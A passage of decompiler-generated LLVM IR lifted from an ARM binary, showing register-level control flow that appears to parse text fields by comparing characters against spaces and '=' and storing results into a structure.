  store i1 %v7_913c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_913c, label %.thread24, label %dec_label_pc_9144

dec_label_pc_9144:                                ; preds = %.thread23
  %v0_9144 = load i32, i32* @r5, align 4
  store i32 %v0_9144, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_914c = inttoptr i32 %v0_9144 to i32*
  %v3_914c = call i32 @function_11a14(i32 44, i32* %v2_914c)
  %v0_9150 = load i32, i32* @fp, align 4
  store i32 %v0_9150, i32* @r1, align 4
  store i32 %v3_914c, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_915c = call i32 @function_126cc(i8* %v3_829c, i32 %v0_9150, i32 %v3_914c)
  store i32 %v4_915c, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* @lr, align 4
  %v2_9164 = add i32 %v4_915c, %v2_8278
  %v3_9164 = inttoptr i32 %v2_9164 to i8*
  %v4_9164 = load i8, i8* %v3_9164, align 1
  %v2_916c = icmp ugt i8 %v4_9164, 31
  store i1 %v2_916c, i1* %cpsr_c.global-to-local, align 1
  %v7_916c = icmp eq i8 %v4_9164, 32
  store i1 %v7_916c, i1* %cpsr_z.global-to-local, align 1
  %v2_9174 = zext i1 %v7_916c to i32
  %v2_9174.v4_915c = add i32 %v2_9174, %v4_915c
  store i32 %v2_9174.v4_915c, i32* @r4, align 4
  %v2_9178 = add i32 %v2_9174.v4_915c, %v2_8278
  store i32 %v2_9178, i32* @r6, align 4
  store i32 %v2_9178, i32* %r0.global-to-local, align 4
  %v1_9180 = load i32, i32* @fp, align 4
  %v2_9180 = sub i32 %v1_9180, %v2_9174.v4_915c
  store i32 %v2_9180, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_918c = call i32 @function_12428(i32 %v2_9178, i32 %v2_9180, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2)
  store i32 %v5_918c, i32* %r0.global-to-local, align 4
  %v2_9190 = icmp eq i32 %v5_918c, -1
  store i1 %v2_9190, i1* %cpsr_c.global-to-local, align 1
  %v7_9190 = icmp eq i32 %v5_918c, -1
  store i1 %v7_9190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9190, label %.thread24, label %dec_label_pc_9198

dec_label_pc_9198:                                ; preds = %dec_label_pc_9144
  %v2_9198 = icmp ne i32 %v5_918c, 0
  store i1 %v2_9198, i1* %cpsr_c.global-to-local, align 1
  %v7_9198 = icmp eq i32 %v5_918c, 1
  store i1 %v7_9198, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %r2.global-to-local, align 4
  %v7_91a0 = icmp slt i32 %v5_918c, 2
  br i1 %v7_91a0, label %bb173, label %bb172

bb172:                                            ; preds = %dec_label_pc_9198
  %v9_91a0 = add i32 %v5_918c, -2
  store i32 %v9_91a0, i32* %r0.global-to-local, align 4
  br label %bb173

bb173:                                            ; preds = %dec_label_pc_9198, %bb172
  %v1_91a8 = phi i32 [ %v5_918c, %dec_label_pc_9198 ], [ %v9_91a0, %bb172 ]
  store i32 %v2_86d8, i32* %r2.global-to-local, align 4
  %v2_91a8 = add i32 %v1_91a8, %v2_86d8
  %v1_91ac = load i32, i32* @r4, align 4
  %v2_91ac = add i32 %v2_91a8, %v1_91ac
  store i32 %v2_91ac, i32* %r3.global-to-local, align 4
  %v0_91b0 = load i32, i32* @r5, align 4
  %v1_91b0 = trunc i32 %v0_91b0 to i8
  %v3_91b0 = load i32, i32* @r7, align 4
  %v4_91b0 = add i32 %v3_91b0, %v2_91ac
  %v5_91b0 = inttoptr i32 %v4_91b0 to i8*
  store i8 %v1_91b0, i8* %v5_91b0, align 1
  %v0_91b4 = load i32, i32* @r6, align 4
  store i32 %v0_91b4, i32* %r0.global-to-local, align 4
  %v1_91b8 = inttoptr i32 %v0_91b4 to i8*
  %v2_91b8 = call i32 @function_12370(i8* %v1_91b8)
  %v0_91bc = load i32, i32* @r5, align 4
  store i32 %v0_91bc, i32* %r1.global-to-local, align 4
  store i32 %v2_91b8, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_91c8 = inttoptr i32 %v0_91bc to i32*
  %v3_91c8 = call i32 @function_11a14(i32 43, i32* %v2_91c8)
  %v0_91cc = load i32, i32* @r4, align 4
  store i32 %v0_91cc, i32* @r1, align 4
  store i32 %v3_91c8, i32* %r2.global-to-local, align 4
  %v0_91d4 = load i32, i32* @r6, align 4
  store i32 %v0_91d4, i32* %r0.global-to-local, align 4
  %v3_91d8 = inttoptr i32 %v0_91d4 to i8*
  %v4_91d8 = call i32 @function_126cc(i8* %v3_91d8, i32 %v0_91cc, i32 %v3_91c8)
  store i32 %v4_91d8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_91dc = icmp eq i32 %v4_91d8, 0
  store i1 %v2_91dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_91dc, label %.thread24, label %bb174

bb174:                                            ; preds = %bb173
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_91e4 = load i32, i32* @sl, align 4
  %v3_91e4 = add i32 %v2_91e4, 4
  %v4_91e4 = inttoptr i32 %v3_91e4 to i32*
  store i32 1, i32* %v4_91e4, align 4
  br label %.thread24

.thread24:                                        ; preds = %bb173, %dec_label_pc_9144, %.thread23, %bb174
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_91f4 = load i32, i32* @sl, align 4
  %v2_91f4 = add i32 %v1_91f4, 8
  %v3_91f4 = inttoptr i32 %v2_91f4 to i32*
  store i32 0, i32* %v3_91f4, align 4
  %v3_91f8 = call i32 @function_11a14(i32 41, i32* null)
  %v0_91fc = load i32, i32* @fp, align 4
  store i32 %v0_91fc, i32* @r1, align 4
  store i32 %v3_91f8, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9208 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_91fc, i32 %v3_91f8)
  store i32 %v4_9208, i32* %r0.global-to-local, align 4
  %v2_9210 = icmp eq i32 %v4_9208, -1
  store i1 %v2_9210, i1* %cpsr_c.global-to-local, align 1
  %v7_9210 = icmp eq i32 %v4_9208, -1
  store i1 %v7_9210, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9210, label %.thread25, label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %.thread24
  %v0_921c = load i32, i32* @r7, align 4
  store i32 %v0_921c, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_9224 = inttoptr i32 %v0_921c to i32*
  %v3_9224 = call i32 @function_11a14(i32 41, i32* %v2_9224)
  %v0_9228 = load i32, i32* @fp, align 4
  store i32 %v0_9228, i32* @r1, align 4
  store i32 %v3_9224, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9234 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_9228, i32 %v3_9224)
  store i32 %v4_9234, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  %v2_923c = add i32 %v4_9234, %v2_8278
  %v3_923c = inttoptr i32 %v2_923c to i8*
  %v4_923c = load i8, i8* %v3_923c, align 1
  store i32 %v2_8278, i32* @lr, align 4
  %v2_9244 = icmp ugt i8 %v4_923c, 31
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  %v7_9244 = icmp eq i8 %v4_923c, 32
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  %v2_924c = zext i1 %v7_9244 to i32
  %v2_924c.v4_9234 = add i32 %v2_924c, %v4_9234
  store i32 %v2_924c.v4_9234, i32* @r4, align 4
  %v2_9250 = add i32 %v2_924c.v4_9234, %v2_8278
  store i32 %v2_9250, i32* @r5, align 4
  store i32 %v2_9250, i32* %r0.global-to-local, align 4
  %v1_9258 = load i32, i32* @fp, align 4
  %v2_9258 = sub i32 %v1_9258, %v2_924c.v4_9234
  store i32 %v2_9258, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9264 = call i32 @function_12428(i32 %v2_9250, i32 %v2_9258, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2)
  store i32 %v5_9264, i32* %r0.global-to-local, align 4
  %v2_9268 = icmp eq i32 %v5_9264, -1
  store i1 %v2_9268, i1* %cpsr_c.global-to-local, align 1
  %v7_9268 = icmp eq i32 %v5_9264, -1
  store i1 %v7_9268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9268, label %.thread25, label %dec_label_pc_9270

dec_label_pc_9270:                                ; preds = %dec_label_pc_921c
  %v2_9270 = icmp ne i32 %v5_9264, 0
  store i1 %v2_9270, i1* %cpsr_c.global-to-local, align 1
  %v7_9270 = icmp eq i32 %v5_9264, 1
  store i1 %v7_9270, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %r1.global-to-local, align 4
  %v7_9278 = icmp slt i32 %v5_9264, 2
  br i1 %v7_9278, label %bb176, label %bb175

bb175:                                            ; preds = %dec_label_pc_9270
  %v9_9278 = add i32 %v5_9264, -2
  store i32 %v9_9278, i32* %r0.global-to-local, align 4
  br label %bb176

bb176:                                            ; preds = %dec_label_pc_9270, %bb175
  %v1_9280 = phi i32 [ %v5_9264, %dec_label_pc_9270 ], [ %v9_9278, %bb175 ]
  store i32 %v2_86d8, i32* %r1.global-to-local, align 4
  %v2_9280 = add i32 %v1_9280, %v2_86d8
  %v1_9284 = load i32, i32* @r4, align 4
  %v2_9284 = add i32 %v2_9280, %v1_9284
  store i32 %v2_9284, i32* %r3.global-to-local, align 4
  %v0_9288 = load i32, i32* @r7, align 4
  %v1_9288 = trunc i32 %v0_9288 to i8
  %v3_9288 = load i32, i32* @r6, align 4
  %v4_9288 = add i32 %v3_9288, %v2_9284
  %v5_9288 = inttoptr i32 %v4_9288 to i8*
  store i8 %v1_9288, i8* %v5_9288, align 1
  %v0_928c = load i32, i32* @r5, align 4
  store i32 %v0_928c, i32* %r0.global-to-local, align 4
  %v1_9290 = inttoptr i32 %v0_928c to i8*
  %v2_9290 = call i32 @function_12370(i8* %v1_9290)
  %v0_9294 = load i32, i32* @r7, align 4
  store i32 %v0_9294, i32* %r1.global-to-local, align 4
  store i32 %v2_9290, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_92a0 = inttoptr i32 %v0_9294 to i32*
  %v3_92a0 = call i32 @function_11a14(i32 42, i32* %v2_92a0)
  %v0_92a4 = load i32, i32* @r4, align 4
  store i32 %v0_92a4, i32* @r1, align 4
  store i32 %v3_92a0, i32* %r2.global-to-local, align 4
  %v0_92ac = load i32, i32* @r5, align 4
  store i32 %v0_92ac, i32* %r0.global-to-local, align 4
  %v3_92b0 = inttoptr i32 %v0_92ac to i8*
  %v4_92b0 = call i32 @function_126cc(i8* %v3_92b0, i32 %v0_92a4, i32 %v3_92a0)
  store i32 %v4_92b0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_92b4 = icmp eq i32 %v4_92b0, 0
  store i1 %v2_92b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_92b4, label %.thread25, label %bb177

bb177:                                            ; preds = %bb176
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_92bc = load i32, i32* @sl, align 4
  %v3_92bc = add i32 %v2_92bc, 8
  %v4_92bc = inttoptr i32 %v3_92bc to i32*
  store i32 1, i32* %v4_92bc, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb176, %dec_label_pc_921c, %.thread24, %bb177
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_92c8 = call i32 @function_11a14(i32 40, i32* null)
  %v0_92cc = load i32, i32* @fp, align 4
  store i32 %v0_92cc, i32* @r1, align 4
  store i32 %v3_92c8, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_92d8 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_92cc, i32 %v3_92c8)
  store i32 %v4_92d8, i32* %r0.global-to-local, align 4
  %v2_92dc = icmp eq i32 %v4_92d8, -1
  store i1 %v2_92dc, i1* %cpsr_c.global-to-local, align 1
  %v7_92dc = icmp eq i32 %v4_92d8, -1
  store i1 %v7_92dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92dc, label %.thread, label %dec_label_pc_92f4

.thread:                                          ; preds = %.thread25
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92ec = load i32, i32* @sl, align 4
  %v3_92ec = add i32 %v2_92ec, 12
  %v4_92ec = inttoptr i32 %v3_92ec to i32*
  store i32 0, i32* %v4_92ec, align 4
  br label %dec_label_pc_9378

dec_label_pc_92f4:                                ; preds = %.thread25
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_92fc = call i32 @function_11a14(i32 40, i32* null)
  %v0_9300 = load i32, i32* @fp, align 4
  store i32 %v0_9300, i32* @r1, align 4
  store i32 %v3_92fc, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_930c = call i32 @function_126cc(i8* %v3_829c, i32 %v0_9300, i32 %v3_92fc)
  store i32 %v4_930c, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* %r2.global-to-local, align 4
  %v2_9314 = add i32 %v4_930c, %v2_8278
  %v3_9314 = inttoptr i32 %v2_9314 to i8*
  %v4_9314 = load i8, i8* %v3_9314, align 1
  %v2_9318 = icmp ugt i8 %v4_9314, 31
  store i1 %v2_9318, i1* %cpsr_c.global-to-local, align 1
  %v7_9318 = icmp eq i8 %v4_9314, 32
  store i1 %v7_9318, i1* %cpsr_z.global-to-local, align 1
  %v2_9324 = zext i1 %v7_9318 to i32
  %v2_9324.v4_930c = add i32 %v2_9324, %v4_930c
  store i32 %v2_9324.v4_930c, i32* @r4, align 4
  %v2_9328 = add i32 %v2_9324.v4_930c, %v2_8278
  store i32 %v2_9328, i32* @r5, align 4
  store i32 %v2_9328, i32* %r0.global-to-local, align 4
  %v1_9330 = load i32, i32* @fp, align 4
  %v2_9330 = sub i32 %v1_9330, %v2_9324.v4_930c
  store i32 %v2_9330, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_933c = call i32 @function_12428(i32 %v2_9328, i32 %v2_9330, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2)
  store i32 %v5_933c, i32* %r0.global-to-local, align 4
  %v2_9340 = icmp eq i32 %v5_933c, -1
  store i1 %v2_9340, i1* %cpsr_c.global-to-local, align 1
  %v7_9340 = icmp eq i32 %v5_933c, -1
  store i1 %v7_9340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9340, label %dec_label_pc_9378, label %dec_label_pc_9348

dec_label_pc_9348:                                ; preds = %dec_label_pc_92f4
  %v2_9348 = icmp ne i32 %v5_933c, 0
  store i1 %v2_9348, i1* %cpsr_c.global-to-local, align 1
  %v7_9348 = icmp eq i32 %v5_933c, 1
  store i1 %v7_9348, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %ip.global-to-local, align 4
  %v7_9350 = icmp slt i32 %v5_933c, 2
  br i1 %v7_9350, label %bb179, label %bb178

bb178:                                            ; preds = %dec_label_pc_9348
  %v9_9350 = add i32 %v5_933c, -2
  store i32 %v9_9350, i32* %r0.global-to-local, align 4
  br label %bb179

bb179:                                            ; preds = %dec_label_pc_9348, %bb178
  %v1_9358 = phi i32 [ %v5_933c, %dec_label_pc_9348 ], [ %v9_9350, %bb178 ]
  store i32 %v2_86d8, i32* %ip.global-to-local, align 4
  %v2_9358 = add i32 %v1_9358, %v2_86d8
  %v1_935c = load i32, i32* @r4, align 4
  %v2_935c = add i32 %v2_9358, %v1_935c
  store i32 %v2_935c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9364 = load i32, i32* @r5, align 4
  store i32 %v0_9364, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_936c = load i32, i32* @r6, align 4
  %v4_936c = add i32 %v3_936c, %v2_935c
  %v5_936c = inttoptr i32 %v4_936c to i8*
  store i8 0, i8* %v5_936c, align 1
  %v2_9370 = inttoptr i32 %v0_9364 to i8*
  %v3_9370 = call i32 @function_12494(i8* %v2_9370, i32 10)
  store i32 %v3_9370, i32* %r0.global-to-local, align 4
  %v1_9374 = load i32, i32* @sl, align 4
  %v2_9374 = add i32 %v1_9374, 12
  %v3_9374 = inttoptr i32 %v2_9374 to i32*
  store i32 %v3_9370, i32* %v3_9374, align 4
  br label %dec_label_pc_9378

dec_label_pc_9378:                                ; preds = %.thread, %dec_label_pc_92f4, %bb179
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_937c

dec_label_pc_937c:                                ; preds = %dec_label_pc_9548, %dec_label_pc_94c8, %dec_label_pc_9378
  %v1_9388 = phi i32 [ 0, %dec_label_pc_9378 ], [ %v0_94c8, %dec_label_pc_94c8 ], [ %v1_9388.pre.pre, %dec_label_pc_9548 ]
  store i32 %v2_8278, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9388 = add i32 %v1_9388, %v2_8278
  store i32 %v2_9388, i32* @r4, align 4
  %v3_938c = call i32 @function_11a14(i32 39, i32* null)
  %v0_9390 = load i32, i32* @fp, align 4
  store i32 %v0_9390, i32* @r1, align 4
  store i32 %v3_938c, i32* %r2.global-to-local, align 4
  %v0_9398 = load i32, i32* @r4, align 4
  store i32 %v0_9398, i32* %r0.global-to-local, align 4
  %v3_939c = inttoptr i32 %v0_9398 to i8*
  %v4_939c = call i32 @function_126cc(i8* %v3_939c, i32 %v0_9390, i32 %v3_938c)
  store i32 %v4_939c, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_93a8 = icmp eq i32 %v4_939c, -1
  store i1 %v2_93a8, i1* %cpsr_c.global-to-local, align 1
  %v7_93a8 = icmp eq i32 %v4_939c, -1
  store i1 %v7_93a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93a8, label %dec_label_pc_95d8, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_937c
  %v0_93b4 = load i32, i32* @sl, align 4
  %v1_93b4 = add i32 %v0_93b4, 16
  %v2_93b4 = inttoptr i32 %v1_93b4 to i32*
  %v3_93b4 = load i32, i32* %v2_93b4, align 4
  store i32 %v3_93b4, i32* %r3.global-to-local, align 4
  %v2_93b8 = icmp ugt i32 %v3_93b4, 3
  store i1 %v2_93b8, i1* %cpsr_c.global-to-local, align 1
  %v7_93b8 = icmp eq i32 %v3_93b4, 4
  store i1 %v7_93b8, i1* %cpsr_z.global-to-local, align 1
  %v8_93bc = icmp sgt i32 %v3_93b4, 4
  br i1 %v8_93bc, label %dec_label_pc_95d8, label %dec_label_pc_93c0

dec_label_pc_93c0:                                ; preds = %dec_label_pc_93b4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_93c8 = call i32 @function_11a14(i32 39, i32* null)
  %v0_93cc = load i32, i32* @fp, align 4
  store i32 %v0_93cc, i32* @r1, align 4
  store i32 %v3_93c8, i32* %r2.global-to-local, align 4
  %v0_93d4 = load i32, i32* @r4, align 4
  store i32 %v0_93d4, i32* %r0.global-to-local, align 4
  %v3_93d8 = inttoptr i32 %v0_93d4 to i8*
  %v4_93d8 = call i32 @function_126cc(i8* %v3_93d8, i32 %v0_93cc, i32 %v3_93c8)
  store i32 %v4_93d8, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* @lr, align 4
  %v1_93e0 = load i32, i32* @r5, align 4
  %v2_93e0 = add i32 %v1_93e0, %v4_93d8
  store i32 %v2_93e0, i32* @r8, align 4
  %v2_93e4 = add i32 %v2_93e0, %v2_8278
  %v3_93e4 = inttoptr i32 %v2_93e4 to i8*
  %v4_93e4 = load i8, i8* %v3_93e4, align 1
  %v6_93e4 = zext i8 %v4_93e4 to i32
  store i32 %v6_93e4, i32* %r3.global-to-local, align 4
  %v2_93e8 = icmp ugt i8 %v4_93e4, 31
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v7_93e8 = icmp eq i8 %v4_93e4, 32
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93e8, label %bb180, label %bb181

bb180:                                            ; preds = %dec_label_pc_93c0
  %v2_93ec = add i32 %v4_93d8, 1
  store i32 %v2_93ec, i32* %r0.global-to-local, align 4
  br label %bb181

bb181:                                            ; preds = %dec_label_pc_93c0, %bb180
  %v1_93fc = phi i32 [ %v4_93d8, %dec_label_pc_93c0 ], [ %v2_93ec, %bb180 ]
  %v1_93f0 = load i32, i32* @fp, align 4
  %v2_93f0 = sub i32 %v1_93f0, %v1_93e0
  store i32 %v2_93f0, i32* %r3.global-to-local, align 4
  %v2_93f4 = sub i32 %v2_93f0, %v1_93fc
  store i32 %v2_93f4, i32* @r7, align 4
  %v0_93f8 = load i32, i32* @r4, align 4
  %v2_93f8 = add i32 %v0_93f8, %v1_93fc
  store i32 %v2_93f8, i32* @r6, align 4
  br i1 %v7_93e8, label %bb182, label %bb183

bb182:                                            ; preds = %bb181
  %v3_93fc = add i32 %v1_93fc, %v1_93e0
  store i32 %v3_93fc, i32* @r8, align 4
  br label %bb183

bb183:                                            ; preds = %bb181, %bb182
  store i32 %v2_93f4, i32* %r1.global-to-local, align 4
  store i32 %v2_93f8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9410 = call i32 @function_12428(i32 %v2_93f8, i32 %v2_93f4, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2)
  store i32 %v5_9410, i32* %r0.global-to-local, align 4
  %v2_9414 = icmp eq i32 %v5_9410, -1
  store i1 %v2_9414, i1* %cpsr_c.global-to-local, align 1
  %v7_9414 = icmp eq i32 %v5_9410, -1
  store i1 %v7_9414, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9410, i32* @r4, align 4
  br i1 %v7_9414, label %dec_label_pc_94c8, label %dec_label_pc_9420

dec_label_pc_9420:                                ; preds = %bb183
  store i32 %v2_8278, i32* %r1.global-to-local, align 4
  %v2_9424 = icmp ne i32 %v5_9410, 0
  store i1 %v2_9424, i1* %cpsr_c.global-to-local, align 1
  %v7_9424 = icmp eq i32 %v5_9410, 1
  store i1 %v7_9424, i1* %cpsr_z.global-to-local, align 1
  %v7_9428 = icmp slt i32 %v5_9410, 2
  br i1 %v7_9428, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_9420
  %v9_9428 = add i32 %v5_9410, -2
  store i32 %v9_9428, i32* @r4, align 4
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_9420, %bb184
  %v1_942c = load i32, i32* @r8, align 4
  %v2_942c = add i32 %v1_942c, %v2_8278
  store i32 %v2_942c, i32* @r5, align 4
  %v0_9430 = load i32, i32* @r6, align 4
  store i32 %v0_9430, i32* %r0.global-to-local, align 4
  %v0_9434 = load i32, i32* @r7, align 4
  store i32 %v0_9434, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197ec.38 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9440 = call i32 @function_12428(i32 %v0_9430, i32 %v0_9434, i32 ptrtoint (i32* @global_var_197ec.38 to i32), i32 1)
  store i32 %v4_9440, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9444 = icmp eq i32 %v4_9440, 0
  store i1 %v2_9444, i1* %cpsr_z.global-to-local, align 1
  %tmp186 = icmp slt i32 %v4_9440, 1
  br i1 %tmp186, label %.dec_label_pc_9464_crit_edge, label %dec_label_pc_944c

.dec_label_pc_9464_crit_edge:                     ; preds = %bb185
  %v1_9478.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9464

dec_label_pc_944c:                                ; preds = %bb185
  %v0_944c = load i32, i32* @r6, align 4
  store i32 %v0_944c, i32* %r0.global-to-local, align 4
  %v0_9450 = load i32, i32* @r7, align 4
  store i32 %v0_9450, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197ec.38 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_945c = call i32 @function_12428(i32 %v0_944c, i32 %v0_9450, i32 ptrtoint (i32* @global_var_197ec.38 to i32), i32 1)
  store i32 %v4_945c, i32* %r0.global-to-local, align 4
  %v1_9460 = add i32 %v4_945c, -1
  store i32 %v1_9460, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9464

dec_label_pc_9464:                                ; preds = %.dec_label_pc_9464_crit_edge, %dec_label_pc_944c
  %v1_9478 = phi i32 [ %v1_9478.pre, %.dec_label_pc_9464_crit_edge ], [ %v1_9460, %dec_label_pc_944c ]
  store i32 %v2_86d8, i32* %ip.global-to-local, align 4
  %v1_946c = load i32, i32* @r8, align 4
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_946c = add i32 %v1_9478, %v2_86d8
  %v2_9478 = add i32 %v2_946c, %v1_946c
  store i32 %v2_9478, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_9480 = add i32 %v2_9478, -20773
  %v5_9480 = inttoptr i32 %v4_9480 to i8*
  store i8 0, i8* %v5_9480, align 1
  %storemerge5.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_94a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_94a0

dec_label_pc_948c:                                ; preds = %dec_label_pc_94a0
  br i1 %v7_9490, label %dec_label_pc_94d0, label %dec_label_pc_9498

dec_label_pc_9498:                                ; preds = %dec_label_pc_948c
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_94a0

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9464, %dec_label_pc_9498
  %v0_94a0 = phi i32 [ %v0_948c, %dec_label_pc_9498 ], [ %v0_94a0.pre, %dec_label_pc_9464 ]
  %storemerge5 = phi i32 [ %v1_94b4, %dec_label_pc_9498 ], [ %storemerge5.pre, %dec_label_pc_9464 ]
  store i32 %storemerge5, i32* %stack_var_-44, align 4
  store i32 %v0_94a0, i32* %r0.global-to-local, align 4
  %v1_94a4 = inttoptr i32 %v0_94a0 to i8*
  %v2_94a4 = call i32 @function_12370(i8* %v1_94a4)
  store i32 %v2_94a4, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_94ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94ac, i32* %r4.global-to-local, align 4
  %v3_94b0 = icmp uge i32 %v2_94a4, %v3_94ac
  store i1 %v3_94b0, i1* %cpsr_c.global-to-local, align 1
  %v9_94b0 = icmp eq i32 %v2_94a4, %v3_94ac
  store i1 %v9_94b0, i1* %cpsr_z.global-to-local, align 1
  %v1_94b4 = add i32 %v3_94ac, 1
  store i32 %v1_94b4, i32* %ip.global-to-local, align 4
  %v8_94b8 = icmp sgt i32 %v2_94a4, %v3_94ac
  %v0_948c = load i32, i32* @r5, align 4
  %v2_948c = add i32 %v0_948c, %v3_94ac
  %v3_948c = inttoptr i32 %v2_948c to i8*
  %v4_948c = load i8, i8* %v3_948c, align 1
  %v6_948c = zext i8 %v4_948c to i32
  store i32 %v6_948c, i32* %r3.global-to-local, align 4
  %v2_9490 = icmp ugt i8 %v4_948c, 60
  store i1 %v2_9490, i1* %cpsr_c.global-to-local, align 1
  %v7_9490 = icmp eq i8 %v4_948c, 61
  store i1 %v7_9490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_94b8, label %dec_label_pc_948c, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94a0
  br i1 %v7_9490, label %dec_label_pc_94d0, label %dec_label_pc_94c8

dec_label_pc_94c8:                                ; preds = %dec_label_pc_9514, %dec_label_pc_9538, %dec_label_pc_94bc, %bb183
  %v0_94c8 = load i32, i32* @r8, align 4
  store i32 %v0_94c8, i32* @r5, align 4
  br label %dec_label_pc_937c

dec_label_pc_94d0:                                ; preds = %dec_label_pc_948c, %dec_label_pc_94bc
  %v0_94d0 = load i32, i32* @sl, align 4
  %v1_94d0 = add i32 %v0_94d0, 16
  %v2_94d0 = inttoptr i32 %v1_94d0 to i32*
  %v3_94d0 = load i32, i32* %v2_94d0, align 4
  store i32 %v3_94d0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94dc = icmp eq i32 %v3_94d0, 0
  store i1 %v2_94dc, i1* %cpsr_z.global-to-local, align 1
